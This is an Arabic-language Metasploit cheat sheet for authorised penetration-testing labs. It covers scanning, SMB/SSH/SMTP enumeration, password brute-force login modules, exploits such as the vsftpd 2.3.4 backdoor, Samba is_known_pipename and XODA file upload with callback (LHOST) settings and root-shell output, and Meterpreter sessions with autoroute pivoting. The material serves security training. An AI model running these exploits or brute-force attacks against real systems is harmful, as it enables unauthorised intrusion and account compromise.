1. Startup / Database / Workspaces

جهّز Metasploit والـworkspace وحدد الهدف قبل اختيار أي Module.

تشغيل Metasploit بهدوء KALI TERMINAL
msfconsole -q
يفتح msfconsole بدون الـbanner الطويل؛ مناسب أثناء اللاب.
عرض المساعدة الأساسية MSFCONSOLE
help
إذا نسيت command أو syntax داخل msfconsole ابدأ من هنا.
Scan من داخل Metasploit عند الحاجة MSFCONSOLE
db_nmap -sS -sV [TARGET]
يشغّل Nmap ويضيف النتائج إلى قاعدة بيانات Metasploit إذا كانت متصلة.
فحص TCP شامل عند الحاجة KALI TERMINAL
nmap -Pn -p- --min-rate 1000 [TARGET]
استخدم معدل الفحص المناسب للـLab أو قواعد الاختبار المصرح.
تحديد الخدمات والإصدارات KALI TERMINAL
nmap -Pn -sV -sC -p[PORTS] [TARGET]
الـService/Version الناتج هو Trigger للبحث داخل Metasploit، وليس مجرد رقم البورت.
تشغيل Auxiliary Scanner MSFCONSOLE
run
اقرأ النتيجة ثم انتقل للخطوة التالية فقط إذا دعمتها الـEnumeration.
تشغيل الاستغلال MSFCONSOLE
run
لا تشغّل Exploit لمجرد وجود نتيجة search. تأكد من الإصدار والـOS والـpreconditions أولًا.
فحص واجهات Linux بعد الوصول VICTIM SHELL
whoami id ip addr
في أحد اللابات، ip addr كشف NIC ثانية وأعطى فرصة Pivoting؛ وجود NIC ثانية وحده لا يثبت نجاح Pivot.

2. Search & Module Selection

Metasploit ليس بديلًا عن Nmap؛ استخدم نتائج الفحص لتحديد Service ثم اختر Scanner مناسب.

بحث عام عن الخدمة MSFCONSOLE
search [SERVICE]
مراجعة Module قبل استخدامه MSFCONSOLE
info [MODULE] use [MODULE] show options
راجع Description وReferences وRequired Options بدل تشغيل Module بالاسم فقط.
SMB Shares / Users MSFCONSOLE
use auxiliary/scanner/smb/smb_enumshares set RHOSTS [TARGET] run use auxiliary/scanner/smb/smb_enumusers set RHOSTS [TARGET] run
لا تحفظ Module names من الذاكرة للخدمات الأقل شيوعًا؛ إذا كنت غير متأكد استخدم search ثم info/show options.
البحث عن Exploit مطابق MSFCONSOLE
search type:exploit [SERVICE] [VERSION]

3. Module Options / Auxiliary Scanners

ابحث عن Auxiliary scanners أولًا واجمع معلومات الخدمة قبل الانتقال إلى Exploit.

فحص اتصال قاعدة بيانات Metasploit MSFCONSOLE
db_status
إذا كانت قاعدة البيانات متصلة تقدر تستخدم workspaces وhosts/services لتجميع نتائج اللاب.
عرض Hosts المخزنة MSFCONSOLE
hosts
SSH Version MSFCONSOLE
use auxiliary/scanner/ssh/ssh_version set RHOSTS [TARGET] run
SMTP User Enumeration MSFCONSOLE
use auxiliary/scanner/smtp/smtp_enum set RHOSTS [TARGET] run

4. Credential / Login Modules

استخدم Login Scanners فقط عندما تكون المصادقة فعلًا جزءًا من الخدمة والاختبار مصرحًا به.

إنشاء Workspace للهدف MSFCONSOLE
workspace -a [WORKSPACE] workspace
استخدم Workspace منفصل لكل Lab حتى ما تختلط hosts وservices والـcredentials بين الأهداف.
حصر النتائج في Auxiliary MSFCONSOLE
search type:auxiliary [SERVICE]
مفيد للـversion scanners، enumeration، login scanners وvulnerability checks.
البحث عن Login Scanner MSFCONSOLE
search type:auxiliary [SERVICE] login
مراجعة خيارات الـScanner MSFCONSOLE
use [LOGIN_MODULE] show options
ضبط قوائم المستخدمين وكلمات المرور MSFCONSOLE
set RHOSTS [TARGET] set USER_FILE [USERLIST] set PASS_FILE [WORDLIST] set STOP_ON_SUCCESS true set VERBOSE true run
Password spraying/brute force قد يسبب Lockout أو ضوضاء. نفذه فقط داخل Lab أو بتصريح صريح.
SSH Login Scanner — مثال فعلي مستخدم بالمكتبة MSFCONSOLE
use auxiliary/scanner/ssh/ssh_login set RHOSTS [TARGET] set USER_FILE [USERLIST] set PASS_FILE [WORDLIST] set STOP_ON_SUCCESS true set VERBOSE true run
Success ... SSH session opened
الـoutput الفعلي يختلف حسب الهدف؛ ظهور Success/session هو دليل النجاح.

5. Exploits / Payloads / Handlers

اختيار Exploit مبني على Evidence: Service + Version + OS + Preconditions، وليس على البورت فقط.

عرض Services المخزنة MSFCONSOLE
services
Workflow سريع: Nmap → Service/Version → search داخل Metasploit → info → show options → check إن توفر.
ضبط الهدف والبورت MSFCONSOLE
set RHOSTS [TARGET] set RPORT [PORT] show options
RHOST/RHOSTS = الهدف. لا تخلطها مع LHOST.
مراجعة الـExploit والـTargets MSFCONSOLE
info [EXPLOIT_MODULE] use [EXPLOIT_MODULE] show options show targets show payloads
راجع الـplatform والـtargets والـpayload compatibility والـrequired options.
ضبط الهدف والـCallback MSFCONSOLE
set RHOSTS [TARGET] set RPORT [PORT] set LHOST [ATTACKER_IP] set LPORT [LPORT] show options
قاعدة حرجة: RHOST/RHOSTS هو الهدف، وLHOST هو عنوان جهازك الذي يستطيع الهدف الوصول له.
Check قبل Exploit إذا كان مدعومًا MSFCONSOLE
check
Server appears to be vulnerable / Check failed / Unknown — حسب الـModule والهدف.
check يساعد في تقليل التخمين لكنه لا يضمن نجاح الاستغلال.
VSFTPD 2.3.4 MSFCONSOLE
use exploit/unix/ftp/vsftpd_234_backdoor set RHOST [TARGET] exploit
Backdoor service has been spawned... Command shell session opened whoami → root
Samba is_known_pipename MSFCONSOLE
use exploit/linux/samba/is_known_pipename set RHOST [TARGET] check exploit
Found shell Command shell session opened id → uid=0(root)

6. Sessions / Jobs / Post Modules / Routing

بعد فتح Session، أكد السياق وأدر الجلسات فقط؛ التفاصيل الكبيرة لها ملفات Post-Exploitation مستقلة.

بعد تأكيد الجلسة انتقل إلى Windows/Linux Post-Exploitation أو Privilege Escalation أو Credential Access أو Pivoting حسب النظام والهدف.
عرض الجلسات بعد Login ناجح MSFCONSOLE
sessions sessions -i [SESSION_ID]
بعد Credential ناجح، لا تكرر الاختبار. ادخل الجلسة وأكمل هدف اللاب.
XODA File Upload MSFCONSOLE
use exploit/unix/webapp/xoda_file_upload set RHOSTS [TARGET] set TARGETURI / set LHOST [ATTACKER_IP] exploit
Meterpreter session opened → meterpreter >
عرض الجلسات MSFCONSOLE
sessions
الدخول إلى Session MSFCONSOLE
sessions -i [SESSION_ID]
تأكيد مستخدم Meterpreter METERPRETER
getuid
معلومات النظام METERPRETER
sysinfo
الانتقال إلى System Shell عند الحاجة METERPRETER
shell
إرجاع Session للخلفية METERPRETER
background
يرجعك إلى msfconsole مع إبقاء الجلسة موجودة.
Autoroute عند وجود شبكة داخلية موثقة METERPRETER
run autoroute -s [SUBNET]
إضافة Route ليست دليلًا على نجاح Pivot. لازم تثبت الوصول للشبكة الداخلية لاحقًا في ملف Pivoting.
